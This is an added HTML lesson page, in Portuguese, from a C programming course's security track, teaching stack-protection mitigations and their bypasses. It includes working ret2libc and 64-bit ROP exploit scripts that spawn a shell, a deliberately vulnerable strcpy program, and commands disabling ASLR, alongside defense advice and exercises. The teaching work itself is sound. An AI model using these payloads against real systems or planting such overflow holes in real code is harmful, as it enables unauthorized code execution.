@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4.06 — Mitigações e bypasses: NX→ret2libc, ASLR, PIE, canário e ROP — Aprenda C</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body data-trilha="4">
+<header class="site-header">
+  <a class="brand" href="../index.html">⌘ Aprenda <b>C</b></a>
+  <nav class="top-nav">
+    <a href="../index.html">Roadmap</a>
+    <a href="../exercicios/index.html">Exercícios</a>
+    <a href="../projetos/index.html">Projetos</a>
+  </nav>
+</header>
+<main class="modulo">
+  <nav class="breadcrumb"><a href="../index.html">Roadmap</a> / <a href="../index.html#t4">Trilha 4 — Cyber</a> / Mitigações e bypasses: NX→ret2libc, ASLR, PIE, canário e ROP</nav>
+
+  <header class="mod-header">
+    <div class="mod-cab NUM">4.06</div>
+    <h1>Mitigações e bypasses: NX→ret2libc, ASLR, PIE, canário e ROP</h1>
+    <p class="subtitulo">O que cada proteção impede, como se contorna (teoria e ROP mínimo) e como se defende</p>
+    <div class="chips">
+      <span class="chip">Nível: Avançado/Cyber</span>
+      <span class="chip">Duração: ~45 min</span>
+      <span class="chip">Pré-requisitos: T4.05 (buffer overflow clássico e shellcode)</span>
+    </div>
+    <button class="btn btn-done" data-mod="t4-m06">Marcar concluído</button>
+  </header>
+
+  <section class="card objetivos">
+    <h2>🎯 Objetivos</h2>
+    <p>Estudar as cinco grandes mitigações modernas (NX/DEP, ASLR, PIE, stack canary, RELRO/GOT) — o que cada uma bloqueia, como o atacante contorna (ret2libc, leaks, bruteforce, ROP) — e montar dois exercícios práticos: ret2libc em binário 32-bit com NX ativo e uma ROP chain mínima (ret2system) em 64-bit, sempre no lab.</p>
+  </section>
+
+  <section class="card leitura">
+  <h2>📖 Leitura guiada</h2>
+  
+  
+  <p class="foco"><strong>Foco da leitura:</strong> Consulte o livro "Hacking: The Art of Exploitation" (2ª ed., Jon Erickson) — capítulos sobre ret2libc e ROP — e o CTF Wiki (https://ctf-wiki.org) nas seções "Stack Overflow" (ret2libc, ret2syscall, ROP) e "Mitigation". Use o CTF-wiki como referência rápida dos conceitos citados aqui.</p>
+</section>
+  <section class="card secao">
+  <h2>O pôster das mitigações</h2>
+  <p>Um binário moderno sobrevive ao módulo 05 graças a camadas. Cada linha abaixo é <strong>o que protege</strong>, <strong>como o atacante contorna</strong> e <strong>como você aplica na defesa</strong> — o coração deste módulo.</p>
+  <ul><li><strong>NX/DEP</strong> (páginas da pilha não-executáveis) — impede shellcode na pilha → contorno: <em>ret2libc</em> (pular para código existente do processo) ou ROP → defesa: manter ativo (compilador padrão no Linux) e código que não usa execstack.</li>
+<li><strong>ASLR</strong> (randomização dos endereços por execução: pilha, heap, libc, PIE base) — impede endereço hardcoded → contorno: <em>leak</em> de memória (ex.: format string, módulo 07) para calcular a base naquela sessão → defesa: binário PIE + sysctl kernel.randomize_va_space=2.</li>
+<li><strong>PIE</strong> (o binário em si é randomizado) — fixa main/text em endereço aleatório → contorno: leak de ponteiro do programa ou <em>bruteforce</em> (teoria; caro) → defesa: compilar com <code>-pie</code> (padrão no Ubuntu) + ASLR.</li>
+<li><strong>Stack canary</strong> (valor aleatório antes do ret; se corrompido, aborta) — impede overflow linear até o ret → contorno teórico: <em>leak do canário</em> (via format string) ou overflow em <em>outra estrutura</em> que não o canário → defesa: manter <code>-fstack-protector-all</code> e nunca vazar memória do processo.</li>
+<li><strong>RELRO/GOT</strong> — RELRO (relocação read-only): reduz a superfície de escrita; quando pleno, a GOT vira read-only, bloqueando <em>GOT overwrite</em> (que usaríamos com format string) → contorno: usar o <code>exit</code>/vetor ou ret2libc em vez de escrever na GOT → defesa: <code>-z relro -z now</code> (full RELRO).</li></ul>
+  
+  
+</section>
+<section class="card secao">
+  <h2>NX → ret2libc (32 bits): chamar system(&quot;/bin/sh&quot;)</h2>
+  <p>Com NX ativo, não há execução na pilha — mas <strong>não precisamos dela</strong>: a libc já está mapeada no processo e nela vive <code>system()</code> e a string <code>"/bin/sh"</code>. Recompile você mesmo o prog_trivial <strong>sem</strong> <code>-z execstack</code>. Em 32 bits (cdecl), ao <code>ret</code> para <code>system</code>, a pilha vira os argumentos da chamada: precisamos colocar <code>[system][ret_falso]["/bin/sh"]</code> no payload.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — ret2libc 32-bit</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">gcc -m32 -fno-stack-protector -no-pie -g prog_trivial.c -o prog_trivial_nx
+# rode com ASLR desligado por sessao (lab only):
+sudo setarch i686 -R /bin/bash</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Encontrando os endereços na libc (uma vez por boot)</h2>
+  <p>Com ASLR desligado na sessão, os endereços da libc são estáveis <em>naquela sessão</em>. No gdb:</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — calculando enderecos</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">$ gdb ./prog_trivial_nx
+(gdb) p system
+$1 = {int (const char *)} 0xf7e4ca60 &lt;system&gt;
+(gdb) search &quot;/bin/sh&quot;
+libc.so.6: 0xf7f67a2b
+(gdb) quit</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>system  = 0xf7e4ca60
+/bin/sh = 0xf7f67a2b
+(estes enderecos sao da sessao de exemplo; os seus variam por
+versao da libc/Ubuntu -- meca no seu gdb)</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>O payload ret2libc e a execução</h2>
+  <p>A cadeia explora o <code>ret</code> do próprio <code>vulneravel</code>: <code>padding(76) + "B"*4 (EBP) + SYSTEM + RET_FALSO + "/bin/sh"</code>. Ao <code>ret</code>, EIP=caminho system; system lê o próxima word como retorno (dummy) e a seguinte como argumento — <code>"/bin/sh"</code>. Resultado: <code>system("/bin/sh")</code> = shell.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — ret2libc.py</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">#!/usr/bin/env python3
+# ret2libc.py -- payload para prog_trivial_nx (roda NO LINUX/WSL).
+import struct, sys
+
+offset  = 76
+system  = 0xf7e4ca60          # p system   (sua sessao)
+binsh   = 0xf7f67a2b          # search &quot;/bin/sh&quot;
+
+payload  = b&quot;A&quot; * offset
+payload += b&quot;B&quot; * 4                        # saved EBP (lixo)
+payload += struct.pack(&quot;&lt;I&quot;, system)       # ret -&gt; system
+payload += struct.pack(&quot;&lt;I&quot;, 0xdeadbeef)   # retorno falso do system
+payload += struct.pack(&quot;&lt;I&quot;, binsh)        # arg: &quot;/bin/sh&quot;
+
+sys.stdout.buffer.write(payload)</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ python3 ret2libc.py &gt; p2.bin
+$ ./prog_trivial_nx &quot;$(cat p2.bin)&quot;
+$ id
+uid=1000(voce) ...
+# A shell nao precisa de NENHUM byte executavel na pilha:
+# tudo que executou foi a libc.</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>ASLR e o leak: a arma moderna</h2>
+  <p>Ligue a ASLR de novo e o ret2libc quebra: <code>system</code> muda a cada execução. O contorno real não é desligar — é <strong>vazar</strong>. O atacante precisa de um bug de <em>leitura</em> (ex.: format string, módulo 07) que devolva um endereço real da libc (ex.: o de uma função já resolvida). Com ele calcula a <em>base</em> da libc: <code>base = vazado - offset_da_funcao</code>, e reconstrói <code>system = base + offset_system</code>. PIE usa a mesma ideia com a base do binário. A lição defensiva: <strong>não vaze memória</strong>; todo leak também é uma vulnerabilidade.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>Stack canary: como funciona e a evasão teórica</h2>
+  <p>O canário é um valor aleatório (por processo) gravado <em>entre</em> as variáveis locais e o saved RBP. Antes do <code>ret</code>, a função compara o canário guardado com o esperado; se mudou (overflow linear passou por ali), o <code>__stack_chk_fail</code> aborta. Isso bloqueia o ret2shellcode/ret2libc <em>linear</em>.</p>
+<p><strong>Evasão (teórica, não vamos explodir canário no lab):</strong> para contornar, o atacante precisa (a) <em>vazar o canário</em> (leak entre o buffer e o canário, sem tocá-lo — format string faz isso), e (b) reescrevê-lo exatamente no payload, para que a comparação passe. É um problema de duas fases e só funciona se o programa tiver um bug de leitura antes do de escrita. Na prática, canário elevou brutalmente o custo do exploit — por isso é padrão em toda build moderna.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>RELRO e GOT</h2>
+  <p>A <strong>GOT</strong> (Global Offset Table) guarda endereços resolvidos de funções da libc; a <strong>PLT</strong> faz a resolução laz. Um binário com RELRO parcial tem a GOT gravável — clássico alvo de <em>GOT overwrite</em> (escrever o endereço de <code>printf</code> apontando para <code>system</code>, com format string; veremos a teoria no módulo 07). Com <code>-z relro -z now</code> (full RELRO), a GOT fica <em>read-only após o load</em> e esse vetor morre — o que sobra ao atacante é ret2libc/ROP. Verifique sempre o RELRO do seu binário com <code>checksec</code>.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>ROP: montar sistema a partir de &quot;caixinhas&quot;</h2>
+  <p>Com NX e canário sem leak, o atacante ainda explora <em>código existente</em>. <strong>ROP</strong> (Return-Oriented Programming) encadeia <em>gadgets</em>: sequências de instruções que terminam em <code>ret</code> (ex.: <code>pop rdi ; ret</code>). Cada <code>ret</code> da cadeia popa o próximo endereço da pilha → o atacante "programa" a execução sem escrever um único byte novo de código.</p>
+<p>Exemplo mínimo em 64-bit — a chamada <code>system("/bin/sh")</code> precisa de <code>rdi = "/bin/sh"</code>. Uma gadget <code>pop rdi; ret</code> resolve: <code>[padding][pop_rdi;ret]["/bin/sh"][system][dummy]</code>.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — rop basico 64-bit</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">$ ROPgadget --binary ./rop_prog | grep &quot;pop rdi&quot;
+0x0000000000401234 : pop rdi ; ret
+$ gdb ./rop_prog
+(gdb) p system
+$2 = 0x7ffff7a1f6e0 &lt;system&gt;
+$ objdump -s -j .rodata ./rop_prog | grep -i &quot;/bin/sh&quot;   # ou strings</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>ret2system via ROP em 64 bits (prática)</h2>
+  <p>Programa alvo 64-bit (NX ativo por padrão, sem canário, sem PIE) e o exploit com a cadeia mínima. Os endereços são da sua sessão — meça com gdb/ROPgadget. Se der crash por desalinhamento (<code>movaps</code> no glibc), adicione uma gadget <code>ret</code> pura no começo da cadeia para realinhar a pilha.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — rop.c e rop.py</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* rop.c -- alvo 64-bit para ret2system via ROP (VULNERAVEL).
+   Compile NO LINUX/WSL (NX ja vem ativo; sem execstack):
+   gcc -fno-stack-protector -no-pie -g rop.c -o rop_prog
+   NUNCA use estas flags em codigo real. */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+    char buf[64];
+    if (argc &lt; 2) return 1;
+    strcpy(buf, argv[1]);              /* CWE-121 */
+    printf(&quot;%s\n&quot;, buf);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ ROPgadget --binary ./rop_prog | grep &quot;pop rdi&quot;
+0x0000000000401234 : pop rdi ; ret
+$ gdb ./rop_prog -ex &quot;start&quot; -ex &quot;p system&quot;
+...0x7ffff7a1f6e0 &lt;system&gt;...</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Como se defender</h2>
+  
+  <ul><li>Mitigação não é opcional: compilar com <code>-fstack-protector-all -pie -z relro -z now</code> e NX ativo é o mínimo de qualquer build moderna (o Ubuntu já traz a maioria).</li>
+<li>ASLR do sistema em 2 (<code>kernel.randomize_va_space=2</code>) e nada de <code>hwdata execstack</code> em binários próprios.</li>
+<li>A defesa primária continua sendo eliminar bugs de escrita/leitura limites (módulo 02 + sanitizers). Nenhuma mitigação sobrevive a um leak + um overflow juntos.</li>
+<li>Audite e mantenha atualizada a libc/loader: ret2libc depende exatamente de endereços conhecidos da libc do alvo.</li>
+<li>Em revisão de binários, cheque com <code>checksec</code>: canário/NX/PIE/RELRO. Cada "no" é um convite ao bypass estudado aqui.</li>
+<li>Canário sem leak = trabalho dobrado para o atacante; com leak + overflow juntos, o canário é apenas mais um valor a reescrever — a defesa primária continua sendo eliminar os bugs de escrita e leitura.</li></ul>
+  
+  
+</section>
+  <section class="card exs"><h2>✏️ Exercícios</h2><div class="exercicio" id="ex-1" data-mod="t4-m06">
+  <div class="ex-head">
+    <span class="badge badge-nivel n2">Nível 2</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.06.1</p>
+  <p class="enunciado">Recompile o prog_trivial com <code>-fstack-protector-all</code> (sem execstack, -no-pie) e rode o payload do ret2shellcode do módulo 05. Descreva a saída (deve haver "stack smashing detected") e explique em que momento a detecção dispara.</p>
+  <p class="dica"><strong>Dica:</strong> O abort acontece na comparação do canário, ANTES do ret. Rode no gdb com <code>catch syscall</code> se quiser ver o abort no meio.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ gcc -m32 -fstack-protector-all -no-pie -g prog_trivial.c -o prog_sp
+$ sudo setarch i686 -R ./prog_sp &quot;$(cat payload.bin)&quot;
+*** stack smashing detected ***: &lt;unknown&gt; terminated
+Aborted (core dumped)</code></pre>
+        <p class="obs">O canário foi gerado no início de vulneravel, o payload o destruiu, e a comparação final acionou __stack_chk_fail. Nenhum ret sequer aconteceu.</p></details>
+</div>
+<div class="exercicio" id="ex-2" data-mod="t4-m06">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.06.2</p>
+  <p class="enunciado">Faça o ret2libc do módulo com o seu binário (módulo 06) e, em seguida, LIGUE a ASLR de novo sem mudar os endereços: rode o exploit duas vezes. Por que falha? Refaça o leak hipotético: assuma que um bug de format string vazou <code>puts</code> = 0xf7e4c1d0 e a libc tem puts em offset 0x11a1d0 e system em offset 0x3c0a0. Calcule base e system.</p>
+  <p class="dica"><strong>Dica:</strong> base = vazado - offset_libc_puts; system = base + offset_libc_system.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">base   = 0xf7e4c1d0 - 0x11a1d0 = 0xf7d32000
+system = 0xf7d32000 + 0x3c0a0 = 0xf7d6e0a0
+
+Com a ASLR ligada, 0xf7e4ca60 hardcoded nao existe mais;
+mas com o leak, o exploit calcula system fresco = 0xf7d6e0a0
+e monta o mesmo ret2libc. Essa e a essencia do 64-bit real.</code></pre>
+        </details>
+</div>
+<div class="exercicio" id="ex-3" data-mod="t4-m06">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.06.3</p>
+  <p class="enunciado">Rode o exemplo ROP 64-bit completo: compile <code>rop.c</code>, descubra com ROPgadget a gadget <code>pop rdi; ret</code> e no gdb os endereços de <code>system</code> e de <code>"/bin/sh"</code> (procure com <code>p system</code> e <code>search</code>/<code>strings</code>). Monte ret2libc.py em versão 64-bit (<code>struct.pack("<Q", …)</code>, offset medido via gdb — meça <code>&buf</code> e <code>$rbp</code> como no módulo 05) e atinja <code>system("/bin/sh")</code>. Se der crash de movaps, adicione um <code>ret</code> puro antes da cadeia.</p>
+  <p class="dica"><strong>Dica:</strong> Blow out: o offset 64-bit costuma ser maior (havendo align no rbp). Meça, não chute.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">#!/usr/bin/env python3
+# rop_64.py  (roda NO LINUX/WSL; enderecos da sua sessao)
+import struct, sys
+
+offset   = 88                 # medido no gdb (buf -&gt; rbp)
+pop_rdi  = 0x401234           # ROPgadget  &quot;pop rdi ; ret&quot;
+system   = 0x7ffff7a1f6e0     # gdb: p system
+binsh    = 0x7ffff7d64438     # search &quot;/bin/sh&quot; (ou strings)
+
+payload  = b&quot;A&quot; * offset
+payload += struct.pack(&quot;&lt;Q&quot;, pop_rdi)
+payload += struct.pack(&quot;&lt;Q&quot;, binsh)
+payload += struct.pack(&quot;&lt;Q&quot;, system)
+payload += struct.pack(&quot;&lt;Q&quot;, 0)   # retorno dummy
+
+sys.stdout.buffer.write(payload)</code></pre>
+        <p class="obs">A cadeia: pop rdi <- "/bin/sh"; depois ret cai em system com rdi pronto. Nenhuma instrução nova foi executada — só reuso de gadgets.</p></details>
+</div></section>
+  
+<section class="card quiz-card" data-quiz-json='[{&quot;pergunta&quot;:&quot;NX ativo impede o quê, e qual o bypass clássico?&quot;,&quot;opcoes&quot;:[&quot;Executar código da pilha; bypass é ret2libc (chamar system da libc)&quot;,&quot;Ler o canário; bypass é bruteforce do canário&quot;,&quot;Usar o gdb; bypass é usar strace&quot;,&quot;Compilar em 32 bits; bypass é -m64&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;NX torna a pilha/heap não-executáveis; ret2libc reaproveita código da libc já mapeada.&quot;},{&quot;pergunta&quot;:&quot;Qual a defesa primária que nenhuma mitigação substitui?&quot;,&quot;opcoes&quot;:[&quot;Eliminar os bugs de memória (limites em cópias e leituras)&quot;,&quot;Usar senhas fortes&quot;,&quot;Instalar um firewall&quot;,&quot;Comprar um antivírus&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Canário/NX/ASLR/PIE/RELRO são camadas de contenção; o bug primário continua sendo o overflow/leak.&quot;},{&quot;pergunta&quot;:&quot;Por que o canário frustra o buffer overflow linear clássico?&quot;,&quot;opcoes&quot;:[&quot;Ele detecta a corrupção (valor aleatório antes do ret) e aborta antes do ret&quot;,&quot;Ele move o ret para uma posição fixa&quot;,&quot;Ele encripta os endereços da pilha&quot;,&quot;Ele impede o uso de strcpy&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;O canário é escrito entre as locais e o ret; qualquer overflow linear o toca e o __stack_chk_fail aborta.&quot;},{&quot;pergunta&quot;:&quot;O que é um gadget em ROP?&quot;,&quot;opcoes&quot;:[&quot;Uma sequência de instruções no binário que termina em ret&quot;,&quot;Um flag de compilação&quot;,&quot;Uma função da libc&quot;,&quot;Um bug de format string&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Gadgets são \&quot;caixinhas\&quot; de instruções existentes (ex.: pop rdi; ret) encadeadas via pilha.&quot;}]'>
+  <h2>❓ Verificação rápida</h2>
+  <div class="quiz-root"></div>
+</section>
+  <section class="card projeto">
+  <h2>🏗️ Miniprojeto: Matriz mitigação × bypass × defesa</h2>
+  <p>Crie <code>matriz.md</code> com uma tabela de 5 linhas (NX, ASLR, PIE, canário, RELRO/GOT) e colunas: "o que protege" / "como o atacante contorna" / "o que você liga no seu build" / "comando de verificação". Preencha com o que você estudou e teste os comandos de verificação (<code>checksec</code> no pwndbg) nos dois binários reais que você compilou nos módulos 05-06. Feche com um parágrafo: qual mitigação você considera mais barata e mais eficaz de manter sempre ligada, e por quê.</p>
+  <div class="criterios"><h3>Critérios de aceite</h3><ul><li>Tabela com as 5 mitigações e as 4 colunas preenchidas.</li><li>checksec rodado e transcrito para os dois binários (com e sem proteções).</li><li>Cada "como contorna" coerente com o módulo (sem invenções).</li><li>Parágrafo final justificando uma mitigação "básica" para adotar sempre.</li></ul></div>
+</section>
+  <nav class="mod-nav"><a class="btn nav-prev" href="buffer-overflow-classico-stack-ret2shellcode-em-32-bits.html">← 4.05 Buffer overflow clássico (stack): ret2shellcode em 32 bits</a><a class="btn nav-next" href="format-string-bugs-leak-escrita-e-a-regra-da-format-string-explicita.html">4.07 Format string bugs: leak, escrita e a regra da format string explícita →</a></nav>
+  <div class="mod-nav done-nav"><button class="btn btn-done" data-mod="t4-m06">Marcar concluído</button></div>
+</main>
+<footer class="site-footer">
+  <p>Aprenda C — guia progressivo com Beej's Guide, King e conteúdo original.</p>
+</footer>
+<script src="../assets/js/progress.js"></script>
+<script src="../assets/js/highlight.js"></script>
+<script src="../assets/js/quiz.js"></script>
+</body>
+</html>
